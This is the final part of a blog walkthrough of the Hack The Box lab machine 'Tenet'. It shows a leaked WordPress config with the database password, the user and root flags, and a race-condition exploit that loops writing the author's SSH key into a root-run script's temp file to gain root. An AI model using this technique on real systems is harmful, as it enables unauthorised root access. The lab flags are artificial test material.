MySQL database password */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>Opera2112<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL hostname */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_HOST<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_CHARSET<span class="string">&#x27;, &#x27;</span>utf8mb4<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** The Database Collate type. Don&#x27;</span>t change this <span class="keyword">if</span> <span class="keyword">in</span> doubt. */</span><br><span class="line">define( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">define( <span class="string">&#x27;WP_HOME&#x27;</span>, <span class="string">&#x27;http://tenet.htb&#x27;</span>);</span><br><span class="line">define( <span class="string">&#x27;WP_SITEURL&#x27;</span>, <span class="string">&#x27;http://tenet.htb&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@+</span></span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@<span class="built_in">link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point <span class="keyword">in</span> time to invalidate all existing cookies. This will force all <span class="built_in">users</span> to have to <span class="built_in">log</span> <span class="keyword">in</span> again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;QiuK;~(mBy7H3y8G;*|^*vGekSuuxKV$:Tc&gt;5qKr`T&#125;(t?+`r.+`gg,Ul,=!xy6d&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;x3q&amp;hwYy]:S&#123;l;jDU0D&amp;./@]GbBz(P~&#125;]y=3deqO1ZB/`P:GU&lt;tJ[v)4&gt;&lt;&#125;wl_~N&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;JrJ_u34gQ3(x7y_Db8`9%@jq&lt;;&#123;aqQk(Z+uZ|&#125;M,l?6.~Fo/~Tr&#123;0bJIW?@.*|Nu&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;=z0ODLKO&#123;9K;&lt;,&lt;gT[f!y_*1QgIc;#FoN&#125;pvHNP`|hi/;cwK=vCwcC~nz&amp;0:ajW#&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;*.;XACYRMNvA?.r)f~&#125;+A,eMke?/i^O6j$vhZA&lt;E5Vp#N[a&#123;YL TY^-Q[X++u@Ab&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;NtFPN?_NXFqW-Bm6Jv,v-KkjS^8Hz@BIcxc] F&#125;(=v1$B@F/j(`b`7&#123;A$T&#123;DG|;h&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;d14m0mBP eIawFxLs@+CrJz#d(88cx4||&lt;6~_U3F=aCCiyN|]Hr&#123;(mC5&lt; R57zmn&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;Srtt&amp;&#125;(~:K(R(q(FMK&lt;&#125;&#125;%Zes!4%!S`V!KSk)Rlq&#123;&gt;Y?f&amp;b`&amp;NW[INM2,a9Zm,SH&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used <span class="keyword">for</span> debugging,</span><br><span class="line"> * visit the documentation.</span><br><span class="line"> *</span><br><span class="line"> * @<span class="built_in">link</span> https://wordpress.org/support/article/debugging-in-wordpress/</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( ! defined( &#x27;</span>ABSPATH<span class="string">&#x27; ) ) &#123;</span></span><br><span class="line"><span class="string">        define( &#x27;</span>ABSPATH<span class="string">&#x27;, __DIR__ . &#x27;</span>/<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/tenet]</span><br><span class="line">└─<span class="comment"># ssh neil@10.10.10.223</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.223 (10.10.10.223)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:WV3NcHaV7asDFwcTNcPZvBLb3MG6RbhW9hWBQqIDwlE.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.223<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">neil@10.10.10.223&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon Jan 18 04:51:48 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.0                Processes:             176</span><br><span class="line">  Usage of /:   15.4% of 22.51GB   Users logged <span class="keyword">in</span>:       0</span><br><span class="line">  Memory usage: 14%                IP address <span class="keyword">for</span> ens160: 10.10.10.223</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 packages can be updated.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Thu Dec 17 10:59:51 2020 from 10.10.14.3</span><br><span class="line">neil@tenet:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(neil) gid=1001(neil) <span class="built_in">groups</span>=1001(neil)</span><br><span class="line">neil@tenet:~$ <span class="built_in">whoami</span></span><br><span class="line">neil</span><br><span class="line">neil@tenet:~$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">neil@tenet:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">b7ec0d7ccbebbfaf18eb70dc14bce4f7</span><br></pre></td></tr></table></figure>
+
+<p>and we got user.txt</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb162.jpg"></li>
+</ul>
+<h3 id="USER-to-ROOT"><a href="#USER-to-ROOT" class="headerlink" title="USER to ROOT"></a>USER to ROOT</h3><p>when I tried sudo -l it showed me neil(user) can run the file “&#x2F;usr&#x2F;local&#x2F;bin&#x2F;enableSSH.sh”</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">neil@tenet:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> neil on tenet:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:</span><br><span class="line"></span><br><span class="line">User neil may run the following commands on tenet:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh</span><br></pre></td></tr></table></figure>
+
+<p>So that’s the thing we need to use to privesc, Here’s that file</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">neil@tenet:~$ <span class="built_in">cat</span> /usr/local/bin/enableSSH.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">checkAdded</span></span>() &#123;</span><br><span class="line"></span><br><span class="line">        sshName=$(/bin/echo <span class="variable">$key</span> | /usr/bin/cut -d <span class="string">&quot; &quot;</span> -f 3)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [[ ! -z $(/bin/grep <span class="variable">$sshName</span> /root/.ssh/authorized_keys) ]]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">                /bin/echo <span class="string">&quot;Successfully added <span class="variable">$sshName</span> to authorized_keys file!&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">                /bin/echo <span class="string">&quot;Error in adding <span class="variable">$sshName</span> to authorized_keys file!&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">checkFile</span></span>() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [[ ! -s <span class="variable">$1</span> ]] || [[ ! -f <span class="variable">$1</span> ]]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">                /bin/echo <span class="string">&quot;Error in creating key file!&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> [[ -f <span class="variable">$1</span> ]]; <span class="keyword">then</span> /bin/rm <span class="variable">$1</span>; <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">exit</span> 1</span><br><span class="line"></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">addKey</span></span>() &#123;</span><br><span class="line"></span><br><span class="line">        tmpName=$(<span class="built_in">mktemp</span> -u /tmp/ssh-XXXXXXXX)</span><br><span class="line"></span><br><span class="line">        (<span class="built_in">umask</span> 110; <span class="built_in">touch</span> <span class="variable">$tmpName</span>)</span><br><span class="line"></span><br><span class="line">        /bin/echo <span class="variable">$key</span> &gt;&gt;<span class="variable">$tmpName</span></span><br><span class="line"></span><br><span class="line">        checkFile <span class="variable">$tmpName</span></span><br><span class="line"></span><br><span class="line">        /bin/cat <span class="variable">$tmpName</span> &gt;&gt;/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">        /bin/rm <span class="variable">$tmpName</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key=<span class="string">&quot;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&quot;</span></span><br><span class="line">addKey</span><br><span class="line">checkAdded</span><br></pre></td></tr></table></figure>
+
+<p>So by running this we can add our .pub key to root’s authorized_keys 🙂</p>
+<p>privesc was pretty simple 😀</p>
+<p>So I created a simple script to add my pub key to “&#x2F;root&#x2F;.ssh&#x2F;authorized_keys”</p>
+<p>also I created a loop here to run it multiple times</p>
+<ul>
+<li>root.sh</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMR1r7B7aiEe6j+wBsVumAFqFXCiqw2iSrcg1S7rC1BdlVqr8YfWnT6e/e3+TAJk9idtLz/wN2MkupWtI1ddtNTJz31RQb0WMGjq7p8Usg0uIYhQH0PTN/GmPXDhqLIPcbTnNQMcV2PnwM07eXxQH0+s9rqVO8cR2z2f35bKe3WrHNnT7NwfOoWqNJxh+V8OGgfF8LhS0E46I6co76MJAIsX24Zs9r/dY+JPOlJlS3K2Kf3xSfPAScQeWip1WYY9depVuQywk12kOUikzGNjlQ4phNba47VjfycyV34cLw0/vQcDv5hMCfaK+hoE5rBXysnVx/f3n3zRYMLomgveQUCLBYUwJPE2t0VzeeX4W9wxrAOl2Njx5TI4cEFnmlp/6lO/iK+aC6BSBRxU19jS2fUchiN9PMgLSYGzhuIxOLvvd9AlaOYPNM7a5AfjzzO+gd1fv/Mb9EIZCKibtvpHp0eomnSDcDz/b9FNpbvg6V5NBVy2VaufcRbiBDD6cTS00= root@kali&quot;</span> | <span class="built_in">tee</span> /tmp/ssh-*</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>create this file on &#x2F;home&#x2F;neil directory</p>
+<p>Listen here we need 3 terminals to root</p>
+<ul>
+<li>To run our root.sh file</li>
+<li>To run that enableSSH.sh file (make sure run it as sudo)</li>
+<li>To log in as root</li>
+</ul>
+<p>You need to do this multiple times, I tried it more than 25 times then I got root shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..10000&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">sudo enableSSH.sh </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>many people trying this so don’t get angry try it more time sure you’ll get root shell 😀 or reset it and try again</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># ssh -i /root/.ssh/id_rsa root@10.10.10.223                                                                                                        </span></span><br><span class="line">Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon Jan 18 05:27:48 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.33               Processes:             209</span><br><span class="line">  Usage of /:   15.1% of 22.51GB   Users logged <span class="keyword">in</span>:       1</span><br><span class="line">  Memory usage: 9%                 IP address <span class="keyword">for</span> ens160: 10.10.10.223</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 packages can be updated.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Wed Jan 13 08:03:48 2021</span><br><span class="line">root@tenet:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@tenet:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@tenet:~<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@tenet:~<span class="comment"># cat root.txt</span></span><br><span class="line">3673382097770d93aaf70d520ba508af</span><br></pre></td></tr></table></figure>
+
+<p>and we got root.txt</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb163.jpg"></li>
+</ul>
+<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
+<li>use php deserialization getshell</li>
+<li>add .pub key to root’s authorized_keys to privesc</li>
+</ul>
+<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/01/18/tenet/" title="Hack-The-Box-walkthrough[Tenet]">https://fdlucifer.github.io/2021/01/18/tenet/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/15/cereal/" rel="prev" title="Hack-The-Box-walkthrough[Cereal]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Cereal]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/01/23/chrome-browserv8-pwn/" rel="next" title="HackTheBox-RopeTwo-[PWN-Chrome-V8引擎]">
+                  HackTheBox-RopeTwo-[PWN-Chrome-V8引擎] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
